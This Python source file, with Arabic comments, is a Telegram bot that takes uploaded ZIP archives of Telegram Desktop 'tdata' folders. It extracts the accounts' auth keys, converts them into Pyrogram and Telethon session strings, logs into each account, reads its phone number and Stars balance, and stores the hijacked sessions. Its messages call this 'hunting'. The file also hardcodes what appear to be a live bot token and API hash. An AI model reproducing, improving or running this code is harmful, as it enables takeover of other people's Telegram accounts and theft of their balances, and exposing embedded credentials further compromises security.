import os
import re
import sys
import time
import sqlite3
import zipfile
import shutil
import asyncio
import base64
import struct
import traceback
import logging

# =========================================================
# 🚨 رادار الأخطاء
# =========================================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)

def radar_exception_handler(exctype, value, tb):
    logging.critical("\n" + "="*50)
    logging.critical("🚨 [رادار الأعطال] تم اكتشاف انهيار مخفي!")
    logging.critical("".join(traceback.format_exception(exctype, value, tb)))
    logging.critical("="*50 + "\n")

sys.excepthook = radar_exception_handler

# =========================================================
# 🛠️ ترقيعة الـ Event Loop
# =========================================================
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import Client
from pyrogram.enums import ChatType
from pyrogram.errors import FloodWait, AuthKeyUnregistered, SessionRevoked
from telethon.sessions import StringSession
from telethon.crypto import AuthKey

try:
    from opentele.td import TDesktop
    from opentele.api import API
    OPENTELE_AVAILABLE = True
except ImportError:
    OPENTELE_AVAILABLE = False

# --- الإعدادات (تأكد من صحتها) ---
API_ID = 28797361  
API_HASH = "771041b32e83ab232e066b7adeee700b"  
BOT_TOKEN = "8960187108:AAH3Em4GgZIvtZccKEQcIbBakHTffVBUeBo"  

bot = telebot.TeleBot(BOT_TOKEN)

# =========================================================
# 🗄️ إدارة قواعد البيانات
# =========================================================
def get_db_conn():
    return sqlite3.connect('accounts.db', check_same_thread=False, timeout=20)

def init_db():
    conn = get_db_conn()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions 
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, phone TEXT, user_id INTEGER, 
                 first_name TEXT, pyro_session TEXT, tl_session TEXT, session_type TEXT, stars INTEGER)''')
    conn.commit()
    conn.close()

def save_account(owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, stars):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("INSERT INTO sessions (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, stars) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
              (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, stars))
    conn.commit()
    conn.close()

def get_all_accounts(owner_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("SELECT id, phone, first_name, stars FROM sessions WHERE owner_id=?", (owner_id,))
    return c.fetchall()

def delete_account(acc_id):
    conn = get_db_conn()
    c = conn.cursor()
    c.execute("DELETE FROM sessions WHERE id=?", (acc_id,))
    conn.commit()
    conn.close()

init_db()

# =========================================================
# ⚙️ محرك فك التشفير المطور
# =========================================================

def generate_pyro_session(dc_id, auth_key):
    """توليد جلسة بايروجرام بطريقة تتجنب خطأ الـ unpack"""
    try:
        # تنسيق بايروجرام: [DC_ID (1b)][TestMode (1b)][AuthKey (256b)][UserID (8b)][IsBot (1b)]
        # نستخدم UserID افتراضي 9999 وسيتم تحديثه تلقائياً عند الاتصال
        packed = struct.pack(">B?256sQ?", dc_id, False, auth_key, 9999, False)
        return base64.urlsafe_b64encode(packed).decode("utf-8").rstrip("=")
    except Exception as e:
        logging.error(f"Error packing session: {e}")
        return None

async def extract_tdata_robust(base_dir):
    """بحث عميق وغصبي عن بيانات الـ TDATA"""
    if not OPENTELE_AVAILABLE:
        logging.error("❌ مكتبة opentele مفقودة!")
        return None, None
    
    tdata_path = None
    # البحث عن المجلد الذي يحتوي على 'key_datas'
    for root, dirs, files in os.walk(base_dir):
        if 'key_datas' in files:
            tdata_path = root
            break
            
    if not tdata_path:
        return None, None

    try:
        tdesk = TDesktop(tdata_path)
        # محاولة تحميل الحسابات حتى لو فشل التحقق الأولي
        accounts = tdesk.get_accounts()
        if not accounts:
            return None, None
            
        acc = accounts[0] # نأخذ الحساب الأول
        auth_key = acc.auth_key.key
        dc_id = acc.main_dc_id
        
        return int(dc_id), auth_key
    except Exception as e:
        logging.error(f"Extraction failed: {e}")
        return None, None

async def verify_and_save(owner_id, dc_id, auth_key):
    pyro_session = generate_pyro_session(dc_id, auth_key)
    if not pyro_session: return None
    
    client = Client(f"v_{owner_id}_{int(time.time())}", 
                    api_id=API_ID, api_hash=API_HASH, 
                    session_string=pyro_session, in_memory=True)
    try:
        await client.connect()
        me = await client.get_me()
        
        # محاولة الحصول على النجوم
        stars = 0
        try:
            from pyrogram.raw.functions.payments import GetStarsStatus
            res = await client.invoke(GetStarsStatus(peer=await client.resolve_peer("me")))
            stars = getattr(res, "balance", 0)
        except: pass
        
        # حفظ الجلسة (نستخدم نفس المفتاح لـ Telethon)
        session = StringSession()
        session._dc_id = dc_id
        session._server_address = "149.154.167.51" # Default DC2
        session._port = 443
        session._auth_key = AuthKey(auth_key)
        tl_session = session.save()

        save_account(owner_id, me.phone_number, me.id, me.first_name, pyro_session, tl_session, "TDATA", stars)
        await client.disconnect()
        return f"✅ {me.phone_number} | {me.first_name}"
    except Exception as e:
        logging.error(f"Verification failed: {e}")
        return None

# =========================================================
# 📥 التعامل مع الرسائل
# =========================================================

@bot.message_handler(commands=['start'])
def start(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("📂 إضافة TDATA (ZIP)", callback_data="add"))
    bot.reply_to(message, "🤖 أهلاً بك. أرسل ملف الـ ZIP الخاص بـ TDATA ليتم صيده.", reply_markup=markup)

@bot.message_handler(content_types=['document'])
def handle_zip(message):
    if not message.document.file_name.endswith(".zip"): return
    
    status = bot.reply_to(message, "⏳ جاري المعالجة الغصبية...")
    
    # تنزيل وفك الضغط
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    
    tmp_dir = f"temp_{message.from_user.id}_{int(time.time())}"
    os.makedirs(tmp_dir, exist_ok=True)
    zip_path = os.path.join(tmp_dir, "data.zip")
    
    with open(zip_path, 'wb') as f: f.write(downloaded)
    
    try:
        with zipfile.ZipFile(zip_path, 'r') as z: z.extractall(tmp_dir)
        
        # استخراج
        dc_id, auth_key = asyncio.run(extract_tdata_robust(tmp_dir))
        
        if dc_id and auth_key:
            res = asyncio.run(verify_and_save(message.from_user.id, dc_id, auth_key))
            if res:
                bot.edit_message_text(f"🎯 تم الصيد بنجاح!\n{res}", message.chat.id, status.message_id)
            else:
                bot.edit_message_text("❌ الملف صحيح ولكن الجلسة منتهية أو محظورة.", message.chat.id, status.message_id)
        else:
            bot.edit_message_text("❌ لم أتمكن من العثور على مفاتيح صالحة داخل الملف.", message.chat.id, status.message_id)
            
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ فني: {e}", message.chat.id, status.message_id)
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

# =========================================================
# 🚀 التشغيل
# =========================================================
if __name__ == "__main__":
    print("🚀 Bot is running...")
    bot.infinity_polling()
